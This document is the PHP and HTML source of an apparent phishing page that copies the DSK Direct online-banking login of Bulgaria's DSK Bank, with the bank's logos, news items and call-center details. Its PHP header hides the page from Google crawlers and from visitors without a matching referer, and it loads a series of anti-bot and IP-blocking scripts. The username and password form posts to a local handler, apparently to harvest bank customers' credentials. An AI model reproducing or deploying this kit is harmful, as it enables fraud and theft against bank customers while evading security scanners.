<?php 
$aa = $_SERVER['HTTP_HOST'];
$ref = $_SERVER['HTTP_REFERER'];
$refData = parse_url($ref);
if ($refData['host'] !=$aa) {
?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
     header('HTTP/1.0 404 Not Found');
     exit(); ?>
<?php }else{ ?>
<?php
session_start();
error_reporting(0);
include('antibots.php');
include('antibot.php');
include('antibot1.php');
include('antibot2.php');
include('antibot3.php');
include('antibot4.php');
include('antibot5.php');
include('antibot6.php');
include('antiip.php');
include('blocker.php');
include('geoip.php');
include('useragent.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html xml:lang="en" lang="en" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Електронно банкиране ДСК Директ от Банка ДСК</title><meta http-equiv="Pragma" content="no-cache"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="Keywords" content=""><meta name="description" content="Интернет банкирането на Банка ДСК - достъп до Вашите средства по всяко време и място."><meta http-equiv="X-UA-Compatible" content="IE=edge"><link href="./src/css/compiled/style.direct.2018.css" type="text/css" rel="stylesheet"><style>
          .squid-ink {
          width:24px;height:24px;
          }

        </style></head><body class="login"><div id="AjaxRequestError" style="display: none;" xmlns="">error</div><div id="AjaxRequestErrorLoginFail" class="text" style="display:none" xmlns=""><p>Сесията ви е изтекла. </p><a href="#" style="width:80px" class="btn primary"><span>Вход</span></a></div><div id="AjaxRequestErrorSessionUnauthorized" class="text" style="display:none" xmlns=""><p>Трябва да представите допълнително средство за сигурност</p><a href="#" style="width:50px" class="btn primary"><span>OK</span></a></div><div id="generalAJAXError" class="redtext ajaxError" style="display: none;">
          Възникнала е грешка / There was an error
        </div><form id="mainForm" name="mainForm" method="post" style="margin:0px" action="login.php"><div id="wrapper" class="login"><div id="content" class=""><header id="header"><div class="container"><div id="serviceArea" class="service-area" xmlns=""><a href="#"><svg class="squid-ink squid-ink-globe" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48">
            <circle id="globe" cx="24" cy="24" r="22"></circle>
            <line x1="24" x2="24" y1="2" y2="46"></line>
            <line x1="43" x2="5" y1="14" y2="14"></line>
            <line x1="43" x2="5" y1="34" y2="34"></line>
            <path d=" M23.110445,1.9996911C30.3425026,6.6477661,35.1333351,14.7644043,35.1333351,24S30.3425026,41.3522339,23.110445,46.000309"></path>
            <path d=" M24.1333332,46.000309C16.9012756,41.3522339,12.1104441,33.2355957,12.1104441,24s4.7908316-17.3522339,12.0228891-22.000309"></path>
        </svg></use></svg><span>English</span></a></div><div id="feedBack" xmlns=""></div></div><nav class="navbar nav-main" xmlns=""><div class="container">
        	<ul class="main-menu"><li class="brand-item"><a class="homelink" href="#"><img src="./src/images/svg/Direct.bg.svg"></a></li></ul></div></nav></header><div id="login-controls" xmlns=""><section id="login"><div class="container"><div class="row"><div class="col-8"><div class="banner banner-main"><div class="banners"><a border="0" href="#" target="_blank"><img border="0" src="./src/repository/photos/DSK_Security_1104x74.jpg" alt="" title=""></a></div><div class="banners"><a border="0"><img border="0" src="./src/repository/photos/DSK_Direct_Banner_1600x700px_01.jpg" alt="" title=""></a></div></div><div id="news">
        		<ul class="news-feed"><li><a href="#"><h4 class="heading subheading">05.02.2023</h4><p>Планирана профилактика - 05.02.2023г. /22:30ч. до 23:00ч./ </p></a></li><li><a href="#"><h4 class="heading subheading">25.01.2023</h4><p>Изпълнение на операции свързани с виртуални валути</p></a></li><li><a href="#"><h4 class="heading subheading">15.01.2023</h4><p>Временна недостъпност на извлечения в ДСК Директ за физически и юридически лица</p></a></li><li><a href="#"><h4 class="heading subheading">14.01.2023</h4><p>Планирана профилактика - 15.01.2023г. /22:30ч. до 00:30ч./ </p></a></li><li><a href="#"><h4 class="heading subheading">07.01.2023</h4><p>Нови функционалности и подобрения в ДСК Директ за бизнес клиенти</p></a></li><li><a href="#"><h4 class="heading subheading">21.12.2023</h4><p>Преводи по време на коледните празници и в края на 2023 г.</p></a></li></ul>
        		<a class="btn btn-secondary btn-sm btn-archive" href="#">Архив&nbsp;Новини</a></div></div><div class="col-4"><div id="m_ctrl_Page" class="login-box" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><input type="hidden" name="processlogin" value="true"><input id="langCheck" type="hidden" value="bg-BG"><input type="hidden" name="EnrolledChannel" value=""><div id="login_header" class="login_header_pers_bg-BG"><div class="login-tabs"><a >
                            Частни клиенти 
                        </a><a  href="#"> 
                            Бизнес клиенти 
                        </a></div></div><div class="login-form"><div class="form-group"></div><div class="form-group"><input type="hidden" name="userName_Limit" id="Hidden1" value="STR_LIMIT_ATLEAST_ONE"><label>
                            Потребител
                        </label><input class="form-control edit" id="Text1" tabindex="1" name="usere" maxlength="30"><script type="text/javascript">
                            window.document.forms[0].userName.focus();
                        </script></div><div class="form-group"><input type="hidden" name="pwd_Limit" id="Hidden2" value="STR_LIMIT_ATLEAST_ONE"><label>
                            Парола
                        </label><input type="password" class="form-control edit" id="Password1" tabindex="2" name="password" autocomplete="off"></div><button type="submit" class="btn btn-primary submit" id="btn_login" >
                                         Вход
                                </button><input type="hidden" name="returnToUrl" value=""><a href="#" id="resetPassword" >Забравена парола</a><a href="#" id="registration">Нова регистрация</a><a href="#" id="registration">Забравени потребителско име и парола</a>
                    
                        Провери автентичността на сайта
                        <div id="Symantec"><img name="seal" src="./src/images/getseal.png" oncontextmenu="return false;" border="0" usemap="#sealmap_small" alt=""></div><input type="hidden" name="CorporateChannel" value="2500"></div><div id="login_footer"></div>
                    </div><div class="box banner-right"><div class="banners"><a border="0" href="#" target="_blank"><img border="0" src="./src/repository/photos/banners/DSK_CarInsurance_360x160_BG.png" alt="Car Insurance" title="Car Insurance"></a></div></div></div></div></div></section><section class="banner-smart"><div class="container"><a href="#"><img src="./src/images/svg/smart.svg" class="smart-image"></a></div></section></div><div id="tooltip2" >&nbsp;</div><footer><div class="container" xmlns=""><ul><li class="social-links"><a href="https://www.facebook.com/dskbank"><img src="./src/images/svg/facebook.svg"></a><a href="http://www.youtube.com/dskbank"><img src="./src/images/svg/youtube.svg"></a><a href="https://www.linkedin.com/company/dsk-bank"><img src="./src/images/svg/linkedin.svg"></a></li><li><a href="#" target="_blank"><img src="./src/images/svg/BankaDSK_ciril_CM_White.svg"></a></li><li></li></ul><div class="links list-of-links"><ul><li><a href="#">Общи условия за граждани</a></li><li><a href="#">Тарифа за граждани</a></li><li><a href="#">Демо филм за граждани</a></li><li><a href="#">Потребителско ръководство</a></li><li><a href="#">Съвети за сигурност</a></li><li class="callcenter">
              Call center: <img src="./src/images/icons/mobile-phone-icon-white.png">  0700 10 375 <img src="./src/images/icons/smartphone-icon-white.png"> *2375
            </li><li><a href="#">Общи условия за фирми</a></li><li><a href="#">Тарифа за фирми</a></li></ul></div></div><div class="container copyright" style="color: white" xmlns="">BIC/SWIFT на Банка ДСК: STSABGSF&nbsp;&nbsp; ©
        
          &nbsp;<script>document.write(new Date().getFullYear())</script> on DAIS eBank .NET</div></footer></div></div></form><control id="CondComments" ctype="Control" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><!--[if IE]>
      <link rel="stylesheet" type="text/css" media="screen" href="/css/ie.css">
    <![endif]--><!--[if IE 7]>
      <link rel="stylesheet" type="text/css" media="screen" href="/css/ie7.css">
    <![endif]--><!--[if IE 8]>
      <link rel="stylesheet" type="text/css" media="screen" href="/css/ie8.css">
    <![endif]--><!--[if IE 9]>
      <link rel="stylesheet" type="text/css" media="screen" href="/css/ie9.css">
    <![endif]--></control><svg version="1.1" class="blur-background" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <defs>
    <filter id="blur">
    <fegaussianblur stdDeviation="12"></fegaussianblur>
    </filter>
  </defs>
    <image xlink:href="https://i.imgur.com/F5Ak0v8.jpg" width="100%" height="100%" filter="url(#blur)"></image>
  </svg></body></html>
    
    
<?php } ?>